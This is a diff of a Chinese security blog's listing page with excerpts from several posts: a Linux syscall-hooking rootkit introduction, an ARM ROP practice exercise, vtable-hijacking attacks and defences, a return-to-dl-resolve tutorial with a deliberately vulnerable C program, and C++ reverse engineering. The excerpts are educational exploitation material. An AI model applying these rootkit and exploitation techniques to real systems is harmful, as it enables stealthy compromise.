+            <a href="/2017/01/04/Rootkit%E6%8A%80%E6%9C%AF%EF%BC%88%E4%B8%80%EF%BC%89%E4%BB%8Esyscall%E5%88%B0hook/" class="post-title-link" itemprop="url">Rootkit技术（一）从syscall到hook</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建于：2017-01-04 15:44:45" itemprop="dateCreated datePublished" datetime="2017-01-04T15:44:45+08:00">2017-01-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
+              </span>
+
+          
+
+        </div>
       </header>
+
     
-    <div class="article-entry" itemprop="articleBody">
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <h2 id="什么是Rootkit"><a href="#什么是Rootkit" class="headerlink" title="什么是Rootkit"></a>什么是Rootkit</h2><p>简单地说，rootkit是一种能够隐身的恶意程序，也就是说，当它进行恶意活动的时候，操作系统根本感觉不到它的存在。想象一下，一个程序能够潜入到当前操作系统中，并且能够主动在进程列表中隐藏病毒，或者替换日志文件输出，或者两者兼而有之——那它就能有效地清除自身存在的证据了。此外，它还可以从受保护的内存区域中操纵系统调用，或将接口上的数据包导出到另一个接口。本文将重点介绍如何通过hooking系统调用来进行这些活动。在本文的第一部分，我们将自定义一个系统调用，然后构造一个hook到这个系统调用上的rootkit。在最后一部分，我们将创建一个rootkit来隐藏我们选择的进程。</p>
+          <h2 id="什么是Rootkit"><a href="#什么是Rootkit" class="headerlink" title="什么是Rootkit"></a>什么是Rootkit</h2><p>简单地说，rootkit是一种能够隐身的恶意程序，也就是说，当它进行恶意活动的时候，操作系统根本感觉不到它的存在。想象一下，一个程序能够潜入到当前操作系统中，并且能够主动在进程列表中隐藏病毒，或者替换日志文件输出，或者两者兼而有之——那它就能有效地清除自身存在的证据了。此外，它还可以从受保护的内存区域中操纵系统调用，或将接口上的数据包导出到另一个接口。本文将重点介绍如何通过hooking系统调用来进行这些活动。在本文的第一部分，我们将自定义一个系统调用，然后构造一个hook到这个系统调用上的rootkit。在最后一部分，我们将创建一个rootkit来隐藏我们选择的进程。</p>
 <h2 id="用户空间与内核空间"><a href="#用户空间与内核空间" class="headerlink" title="用户空间与内核空间"></a>用户空间与内核空间</h2><p>之所以要先自定义一个系统调用，就是为了理解内核空间与用户空间中到底发生了什么。在用户空间中运行的进程，对内存的访问将受到一定限制，而在内核空间运行的进程则可以访问所有内存空间。但是，用户空间的代码可以通过内核暴露的接口来访问内核空间，这里的所说的接口就是系统调用。<br>当以root身份运行进程的时候，不见得它们就会运行在内核空间。因为root用户进程仍然是一个用户空间的进程，只不过root用户的进程的UID = 0，内核验证过其身份后会赋予其超级用户权限罢了。但是，即使拥有超级用户权限，仍然需要通过系统调用接口才能请求内核的各种资源，这一点对进一步阅读下面的内容非常重要。</p>
 <h2 id="所需软硬件"><a href="#所需软硬件" class="headerlink" title="所需软硬件"></a>所需软硬件</h2><p>Linux内核（我用的Ubuntu12.04，安装的内核版本为linux-3.10.103）<br>虚拟机（我用的VirtualBox）<br>我给CPU分配了两个CPU内核，4GB内存。</p>
 <h2 id="创建系统调用：pname"><a href="#创建系统调用：pname" class="headerlink" title="创建系统调用：pname"></a>创建系统调用：pname</h2><p>下载Linux内核并解压到<code>/usr/src/</code>目录下：  </p>
@@ -686,42 +931,68 @@
 
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2017/01/04/Rootkit%E6%8A%80%E6%9C%AF%EF%BC%88%E4%B8%80%EF%BC%89%E4%BB%8Esyscall%E5%88%B0hook/" data-id="ckhe7o4m7003ochl7b3wu926r" class="article-share-link">Share</a>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li></ul>
-
-    </footer>
-  </div>
   
-</article>
-
-
   
-    <article id="post-树莓派上练习ARM-PWN" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/12/26/%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E7%BB%83%E4%B9%A0ARM-PWN/" class="article-date">
-  <time datetime="2016-12-26T14:40:56.000Z" itemprop="datePublished">2016-12-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/26/%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E7%BB%83%E4%B9%A0ARM-PWN/">树莓派上练习ARM PWN</a>
-    </h1>
-  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/12/26/%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E7%BB%83%E4%B9%A0ARM-PWN/">
 
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Bruce Fan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BruceFan's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/12/26/%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E7%BB%83%E4%B9%A0ARM-PWN/" class="post-title-link" itemprop="url">树莓派上练习ARM PWN</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建于：2016-12-26 22:40:56" itemprop="dateCreated datePublished" datetime="2016-12-26T22:40:56+08:00">2016-12-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
+              </span>
+
+          
+
+        </div>
       </header>
+
     
-    <div class="article-entry" itemprop="articleBody">
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <p>练习的题目是Exploit Exercises Protostar上的堆栈题目，在树莓派上编译进行练习。<br>用<a target="_blank" rel="noopener" href="http://www.dest-unreach.org/socat/">socat</a>把可执行文件绑定到6666端口。  </p>
+          <p>练习的题目是Exploit Exercises Protostar上的堆栈题目，在树莓派上编译进行练习。<br>用<a target="_blank" rel="noopener" href="http://www.dest-unreach.org/socat/">socat</a>把可执行文件绑定到6666端口。  </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ socat tcp-listen:6666,fork exec:.&#x2F;stack0</span><br></pre></td></tr></table></figure>
 <p>ARM架构上，peda支持不够好，所以我在树莓派上装的<a target="_blank" rel="noopener" href="https://github.com/hugsy/gef">gef</a>。<br>由于这不是一个可执行堆栈，我们需要用ROP来获取shell，可执行文件本身很小，没有多少可用gadgets，需要利用其libc文件。  </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; vmmap</span><br><span class="line">     Start        End     Offset Perm Path</span><br><span class="line">0x00008000 0x00009000 0x00000000 r-x &#x2F;home&#x2F;pi&#x2F;Computer&#x2F;exploit&#x2F;stack0</span><br><span class="line">0x00010000 0x00011000 0x00000000 rw- &#x2F;home&#x2F;pi&#x2F;Computer&#x2F;exploit&#x2F;stack0</span><br><span class="line">0x76e66000 0x76f91000 0x00000000 r-x &#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;libc-2.19.so</span><br><span class="line">0x76f91000 0x76fa1000 0x0012b000 --- &#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;libc-2.19.so</span><br><span class="line">0x76fa1000 0x76fa3000 0x0012b000 r-- &#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;libc-2.19.so</span><br><span class="line">0x76fa3000 0x76fa4000 0x0012d000 rw- &#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;libc-2.19.so</span><br><span class="line">0x76fa4000 0x76fa7000 0x00000000 rw-</span><br><span class="line">0x76fba000 0x76fbf000 0x00000000 r-x &#x2F;usr&#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;libarmmem.so</span><br><span class="line">0x76fbf000 0x76fce000 0x00005000 --- &#x2F;usr&#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;libarmmem.so</span><br><span class="line">0x76fce000 0x76fcf000 0x00004000 rw- &#x2F;usr&#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;libarmmem.so</span><br><span class="line">0x76fcf000 0x76fef000 0x00000000 r-x &#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;ld-2.19.so</span><br><span class="line">0x76ff7000 0x76ffb000 0x00000000 rw-</span><br><span class="line">0x76ffb000 0x76ffc000 0x00000000 r-x [sigpage]</span><br><span class="line">0x76ffc000 0x76ffd000 0x00000000 r-- [vvar]</span><br><span class="line">0x76ffd000 0x76ffe000 0x00000000 r-x [vdso]</span><br><span class="line">0x76ffe000 0x76fff000 0x0001f000 r-- &#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;ld-2.19.so</span><br><span class="line">0x76fff000 0x77000000 0x00020000 rw- &#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;ld-2.19.so</span><br><span class="line">0x7efdf000 0x7f000000 0x00000000 rwx [stack]</span><br></pre></td></tr></table></figure>
@@ -739,42 +1010,68 @@
 
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2016/12/26/%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E7%BB%83%E4%B9%A0ARM-PWN/" data-id="ckhe7o4nr0064chl734pn0p7z" class="article-share-link">Share</a>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ARM/" rel="tag">ARM</a></li></ul>
-
-    </footer>
-  </div>
   
-</article>
-
-
   
-    <article id="post-C-虚函数调用攻防战" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/11/20/C-%E8%99%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%94%BB%E9%98%B2%E6%88%98/" class="article-date">
-  <time datetime="2016-11-20T02:19:15.000Z" itemprop="datePublished">2016-11-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/11/20/C-%E8%99%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%94%BB%E9%98%B2%E6%88%98/">C++虚函数调用攻防战</a>
-    </h1>
-  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/11/20/C-%E8%99%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%94%BB%E9%98%B2%E6%88%98/">
 
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Bruce Fan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BruceFan's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/11/20/C-%E8%99%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%94%BB%E9%98%B2%E6%88%98/" class="post-title-link" itemprop="url">C++虚函数调用攻防战</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建于：2016-11-20 10:19:15" itemprop="dateCreated datePublished" datetime="2016-11-20T10:19:15+08:00">2016-11-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
+              </span>
+
+          
+
+        </div>
       </header>
+
     
-    <div class="article-entry" itemprop="articleBody">
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <p>这篇文章是参考UC Berkeley张超博士的一个视频和两篇NDSS论文，学习的一些关于C++虚函数安全相关的内容。<br><code>虚函数调用</code>是面向对象中的一个很重要的特性，用来支持多态。运行时实际调用的函数是根据对象来决定的。运行时找虚函数是通过<code>vtable</code>函数指针来实现，vtable指针由编译器添加到对象中。</p>
+          <p>这篇文章是参考UC Berkeley张超博士的一个视频和两篇NDSS论文，学习的一些关于C++虚函数安全相关的内容。<br><code>虚函数调用</code>是面向对象中的一个很重要的特性，用来支持多态。运行时实际调用的函数是根据对象来决定的。运行时找虚函数是通过<code>vtable</code>函数指针来实现，vtable指针由编译器添加到对象中。</p>
 <h3 id="虚函数表劫持攻击"><a href="#虚函数表劫持攻击" class="headerlink" title="虚函数表劫持攻击"></a>虚函数表劫持攻击</h3><p>vtable是从对象中读出来的，而对象是位于可写内存段，所以攻击者有可能篡改vtable指针。<br><strong>vtable注入</strong><br>伪造vtable，在每个表项中填写ROP chain的地址。利用uaf等漏洞篡改vtable指针指向伪造的vtable，虚函数调用时，触发ROP。<br><strong>vtable重用</strong><br>不伪造vtable，篡改vtable指针指向已有的vtable。实际中非常少。<br><strong>vtable破坏</strong><br>直接篡改vtable，但现在不可行，因为编译器将vtable放到只读内存页。</p>
 <h3 id="虚函数表防护"><a href="#虚函数表防护" class="headerlink" title="虚函数表防护"></a>虚函数表防护</h3><p><strong>VTint: Protecting Virutal Function Tables’ Integrity</strong><br>目标：二进制层面进行的防护，防护vtable劫持攻击。<br>设计：<code>vtable注入</code>和<code>vtable破坏</code>两种攻击方法的vtable都是可写的，因此在运行时检查vtable是否可写，如果可写则判断为受到攻击。<code>vtable重用</code>可以通过区分数据和vtable进行部分防护。<br>实现：理解二进制程序的基础上，对二进制程序进行修改。<br>1.解析二进制文件，恢复高级信息，如识别vtable信息、虚函数调用点。<br>PE文件格式：重定位表、导入/导出表<br>输出：候选函数入口点（重定位表中恢复）、候选vtable（vtable是一个数组，其中每个表项是一个虚函数指针，vtable需要重定位，每个表项也需要重定位）。<br>2.反汇编恢复控制流图等高级信息。<br>(1)识别构造函数：给对象分配内存、将vtable拷贝到分配内存中、成员变量初始化。<br>(2)识别真正的vtable：vtable一定会在某个构造函数中被引用到，所以被引用到的就是真正的vtable。<br>(3)识别虚函数调用：<br>虚函数调用是间接调用，this指针是虚函数调用的第一个参数。  </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [edi] ; edi保存vtable</span><br><span class="line">push ecx ; PE中this指针存在ecx</span><br><span class="line">call [eax+8]</span><br></pre></td></tr></table></figure>
@@ -784,42 +1081,68 @@
 
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2016/11/20/C-%E8%99%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%94%BB%E9%98%B2%E6%88%98/" data-id="ckhe7o4ko0015chl7e71wc71n" class="article-share-link">Share</a>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C-C/" rel="tag">C/C++</a></li></ul>
-
-    </footer>
-  </div>
   
-</article>
-
-
   
-    <article id="post-Return-to-dl-resolve" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/11/09/Return-to-dl-resolve/" class="article-date">
-  <time datetime="2016-11-09T02:59:58.000Z" itemprop="datePublished">2016-11-09</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/11/09/Return-to-dl-resolve/">Return-to-dl-resolve</a>
-    </h1>
-  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/11/09/Return-to-dl-resolve/">
 
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Bruce Fan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BruceFan's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/11/09/Return-to-dl-resolve/" class="post-title-link" itemprop="url">Return-to-dl-resolve</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建于：2016-11-09 10:59:58" itemprop="dateCreated datePublished" datetime="2016-11-09T10:59:58+08:00">2016-11-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
+              </span>
+
+          
+
+        </div>
       </header>
+
     
-    <div class="article-entry" itemprop="articleBody">
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <p>本文介绍通过return-to-dl-resolve的手法绕过NX和ASLR的限制。<br>这里构造一个存在栈缓冲区漏洞的程序，以方便后续构造ROP链。  </p>
+          <p>本文介绍通过return-to-dl-resolve的手法绕过NX和ASLR的限制。<br>这里构造一个存在栈缓冲区漏洞的程序，以方便后续构造ROP链。  </p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>编译：  </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -o bof -m32 -fno-stack-protector bof.c</span><br></pre></td></tr></table></figure>
@@ -865,42 +1188,68 @@
 
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2016/11/09/Return-to-dl-resolve/" data-id="ckhe7o4m6003mchl7e16ubtw0" class="article-share-link">Share</a>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
-
-    </footer>
-  </div>
   
-</article>
-
-
   
-    <article id="post-C-虚函数逆向分析（一）" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/11/02/C-%E8%99%9A%E5%87%BD%E6%95%B0%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
-  <time datetime="2016-11-02T12:53:07.000Z" itemprop="datePublished">2016-11-02</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/11/02/C-%E8%99%9A%E5%87%BD%E6%95%B0%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/">C++虚函数逆向分析（一）</a>
-    </h1>
-  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/11/02/C-%E8%99%9A%E5%87%BD%E6%95%B0%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/">
 
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Bruce Fan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BruceFan's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/11/02/C-%E8%99%9A%E5%87%BD%E6%95%B0%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">C++虚函数逆向分析（一）</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建于：2016-11-02 20:53:07" itemprop="dateCreated datePublished" datetime="2016-11-02T20:53:07+08:00">2016-11-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
+              </span>
+
+          
+
+        </div>
       </header>
+
     
-    <div class="article-entry" itemprop="articleBody">
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <p>本文以一个简单C++例子进行介绍。</p>
+          <p>本文以一个简单C++例子进行介绍。</p>
 <blockquote>
 <p>示例代码编译时没有使用RTTI，也没有使用异常机制<br>下文中的样例在x86平台上测试<br>所有二进制文件已经被strip了<br>大多数虚函数的实现细节都没有标准化，并且不同编译器之间可能会有所不一样。因此，我们将专注于GCC的行为。</p>
 </blockquote>
@@ -925,132 +1274,184 @@
 
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2016/11/02/C-%E8%99%9A%E5%87%BD%E6%95%B0%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="ckhe7o4kr0017chl78wgcbab0" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C-C/" rel="tag">C/C++</a></li></ul>
 
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-
-
-  <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/page/8/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/10/">Next &amp;raquo;</a>
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/8/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/10/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
-</section>
-        
-          <aside id="sidebar">
-  
-    
 
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
   
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARM/" rel="tag">ARM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithms/" rel="tag">Algorithms</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blockchain/" rel="tag">Blockchain</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C-C/" rel="tag">C/C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IoT/" rel="tag">IoT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Machine-Learning/" rel="tag">Machine Learning</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Symbolic-Execution/" rel="tag">Symbolic Execution</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tensorflow/" rel="tag">Tensorflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Virtual/" rel="tag">Virtual</a></li></ul>
-    </div>
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
   </div>
 
+  <aside class="sidebar">
+    <div class="sidebar-inner">
 
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
